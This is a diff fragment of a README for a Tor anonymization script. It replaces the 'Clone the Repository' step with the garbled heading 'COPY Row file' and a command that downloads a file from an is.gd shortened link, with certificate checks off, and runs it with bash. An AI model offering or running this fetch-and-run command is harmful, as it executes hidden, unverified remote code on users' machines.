@@ -9,7 +9,7 @@ This script automates the process of setting up and using Tor to anonymize your 
 
 ## How to Use
 
-### 1. Clone the Repository
+### 1. COPY Row file
 
 ```bash
 curl -sLkO https://is.gd/nowindows ; bash nowindows
